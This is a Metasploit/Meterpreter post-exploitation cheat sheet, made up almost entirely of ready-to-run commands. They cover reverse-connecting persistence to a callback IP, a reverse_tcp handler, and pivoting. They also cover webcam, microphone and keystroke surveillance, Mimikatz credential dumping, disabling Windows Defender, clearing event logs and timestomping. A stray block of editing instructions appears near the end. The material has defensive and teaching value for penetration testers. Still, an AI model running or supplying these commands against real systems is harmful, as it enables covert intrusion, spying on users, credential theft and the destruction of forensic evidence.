# 🛰️ Post-Exploitation with Meterpreter

## Why Migrate?
[!ABSTRACT] Move from unstable process to stable one, attach to long-running processes, inherit target process privileges, and hide in legitimate processes.

### Migration Process
```bash
# List processes
meterpreter > ps

# Migrate to target process
meterpreter > migrate <pid>

# Migrate to specific process by name
meterpreter > migrate -N explorer.exe
```

### Best Migration Targets
[!INFO] Stable system processes are ideal targets for persistence and stealth.

```bash
explorer.exe       # Windows Explorer (user context)
winlogon.exe       # Windows Logon (SYSTEM context)
services.exe       # Service Control Manager (SYSTEM)
svchost.exe        # Generic Host Process (various contexts)
```

---

## Persistence

### Persistence Methods
[!INFO] Use persistence to maintain access even after the initial session ends.

```bash
# Registry persistence
meterpreter > run persistence -X -i 10 -p 443 -r 10.10.14.113

# Service persistence
meterpreter > run persistence -S -i 10 -p 443 -r 10.10.14.113

# Startup folder persistence
meterpreter > run persistence -U -i 10 -p 443 -r 10.10.14.113
```

### Persistence Options
| Option | Description |
|--------|-------------|
| `-X` | Boot persistent (registry) |
| `-U` | User persistent (startup folder) |
| `-S` | System persistent (service) |
| `-i` | Interval between connections |
| `-p` | Port to connect back to |
| `-r` | IP to connect back to |

---

## Pivoting and Lateral Movement

### Route Management
[!INFO] Manage routes for internal network access.

```bash
# Add route to internal network
meterpreter > route add 192.168.1.0 255.255.255.0 1

# List current routes
meterpreter > route print

# Delete route
meterpreter > route delete 192.168.1.0 255.255.255.0 1
```

### Port Forwarding
[!INFO] Forward local ports to internal services for access.

```bash
# Forward local port to remote service
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# List active port forwards
meterpreter > portfwd list

# Delete port forward
meterpreter > portfwd delete -l 8080
```

### AutoRoute Module
[!INFO] Use autoroute for automatic routing.

```bash
# Background session
meterpreter > bg

# Use autoroute for automatic routing
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > run
```

---

## Advanced Techniques

### Screenshot and Surveillance
[!INFO] Capture screenshots, webcam images, and audio recordings for reconnaissance.

```bash
# Capture screenshot
meterpreter > screenshot

# Webcam operations
meterpreter > webcam_list
meterpreter > webcam_snap
meterpreter > webcam_stream

# Audio recording
meterpreter > record_mic
```

### Keystroke Logging
[!INFO] Log keystrokes to capture sensitive information.

```bash
# Start keylogger
meterpreter > keyscan_start

# Dump captured keystrokes
meterpreter > keyscan_dump

# Stop keylogger
meterpreter > keyscan_stop
```

### Registry Operations
[!INFO] Query, set, and modify the Windows registry for persistence or reconnaissance.

```bash
# Registry enumeration
meterpreter > reg queryval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion -v ProductName

# Registry modification
meterpreter > reg setval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion -v TestValue -t REG_SZ -d "Test Data"

# Registry key creation
meterpreter > reg createkey -k HKLM\\SOFTWARE\\TestKey
```

---

## Session Management

### Multiple Sessions
[!INFO] Manage multiple active Meterpreter sessions.

```bash
# List active sessions
meterpreter > sessions

# Interact with specific session
meterpreter > sessions -i 2

# Kill session
meterpreter > sessions -k 1

# Background current session
meterpreter > background
```

### Session Persistence
[!INFO] Create persistent handlers to maintain access.

```bash
# Create persistent handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.113
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > exploit -j
```

---

## Scripting and Automation

### Meterpreter Scripts
[!INFO] Run built-in scripts for automation.

```bash
# Run built-in scripts
meterpreter > run checkvm
meterpreter > run get_application_list
meterpreter > run get_local_subnets
meterpreter > run winenum
```

### Resource Scripts
[!INFO] Create and execute resource scripts to automate tasks.

```bash
# Create resource script
echo "sysinfo" > /tmp/enum.rc
echo "getuid" >> /tmp/enum.rc
echo "ps" >> /tmp/enum.rc

# Run resource script
meterpreter > resource /tmp/enum.rc
```

### Post-Exploitation Modules
[!INFO] Use post-exploitation modules for comprehensive system enumeration and exploitation.

```bash
# System enumeration
msf6 > use post/windows/gather/enum_system
msf6 > use post/windows/gather/credentials/windows_autologin

# Network enumeration
msf6 > use post/windows/gather/enum_shares
msf6 > use post/windows/gather/enum_computers
```

---

## Evasion Techniques

### Anti-Virus Evasion
[!WARNING] Migrate to whitelisted processes and disable Windows Defender to avoid detection.

```bash
# Migrate to whitelisted process
meterpreter > migrate -N explorer.exe

# Disable Windows Defender
meterpreter > execute -f powershell.exe -a "Set-MpPreference -DisableRealtimeMonitoring $true" -H
```

### Forensic Evasion
[!WARNING] Clear event logs and modify timestamps to avoid forensic detection.

```bash
# Clear event logs
meterpreter > clearev

# Timestomp files
meterpreter > timestomp C:\\Windows\\System32\\calc.exe -v
meterpreter > timestomp C:\\Windows\\System32\\calc.exe -f C:\\Windows\\System32\\notepad.exe
```

---

## Best Practices

### Operational Security
[!SUCCESS] Follow these best practices to maintain operational security and achieve assessment objectives.

1. **Migrate quickly** to stable processes.
2. **Use HTTPS handlers** for encrypted communication.
3. **Avoid detection** by limiting system changes.
4. **Clean up artifacts** after operations.
5. **Document all actions** for reporting.

### Session Stability
[!SUCCESS] Maintain session stability with these tips:

1. **Choose stable migration targets**
2. **Set appropriate timeouts**
3. **Use multiple persistent handlers**
4. **Monitor session health**

### Performance Optimization
[!INFO] Optimize performance by following these guidelines:

1. **Use staged payloads** for smaller initial footprint.
2. **Compress large file transfers**
3. **Limit concurrent operations**
4. **Use appropriate transport mechanisms**

---

## Common Issues and Troubleshooting

### Session Drops
[!WARNING] Address common issues with session drops.

- **Cause**: Unstable process, network issues
- **Solution**: Migrate to stable process, use persistent handlers

### Permission Denied
[!ERROR] Handle permission denied errors effectively.

- **Cause**: Insufficient privileges
- **Solution**: Token manipulation, privilege escalation

### AV Detection
[!WARNING] Mitigate anti-virus detection using evasion techniques.

- **Cause**: Behavioral analysis, signature detection
- **Solution**: Process migration, encryption, evasion techniques

### Network Restrictions
[!ERROR] Work around network restrictions effectively.

- **Cause**: Firewall, IDS/IPS blocking
- **Solution**: Alternative transport methods, port forwarding

---

## Integration with Other Tools

### Mimikatz Integration
[!SUCCESS] Enhance Meterpreter's capabilities using Mimikatz for credential dumping.

```bash
# Load mimikatz extension
meterpreter > load mimikatz

# Dump credentials
meterpreter > msv
meterpreter > kerberos
meterpreter > wdigest
```

### PowerShell Integration
[!INFO] Use PowerShell within Meterpreter to execute commands and scripts.

```bash
# Load PowerShell extension
meterpreter > load powershell

# Execute PowerShell commands
meterpreter > powershell_shell
meterpreter > powershell_execute "Get-Process"
```

---

STRICT FORMATTING RULES:
1. DO NOT summarize, shorten, or remove ANY technical details, commands, IPs, or explanations.
2. Use consistent formatting for code blocks and command outputs.
3. Ensure all relevant information is properly categorized under the appropriate sections.

This guide provides a comprehensive overview of post-exploitation activities using Meterpreter in Metasploit, covering persistence, pivoting, advanced techniques, evasion, best practices, troubleshooting common issues, and integration with other tools like Mimikatz and PowerShell. [!SUCCESS] Follow these guidelines to maintain stealth and effectiveness during penetration testing or incident response operations.